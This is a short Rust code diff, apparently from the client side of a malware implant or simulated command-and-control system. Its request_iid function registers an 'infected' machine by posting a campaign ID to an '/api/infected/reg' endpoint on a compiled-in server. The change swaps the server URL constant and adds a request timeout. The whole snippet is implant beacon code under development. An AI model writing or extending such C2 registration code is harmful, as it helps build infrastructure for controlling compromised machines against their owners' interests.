@@ -1,17 +1,20 @@
+use std::time::Duration;
+
 use anyhow::Result;
 use reqwest::Client;
 use serde_json::{Value, json};
 
-use crate::constants::compiled::{CCID, SIMCC_URL};
+use crate::constants::compiled::{self, CCID, HTTP_URL};
 
 pub async fn request_iid() -> Result<String> {
     let client = Client::new();
 
     let res = client
-        .post(SIMCC_URL("/api/infected/reg"))
+        .post(HTTP_URL("/api/infected/reg"))
         .json(&json!({
             "ccid": CCID
         }))
+        .timeout(Duration::from_secs(3))
         .send()
         .await?
         .error_for_status()?;
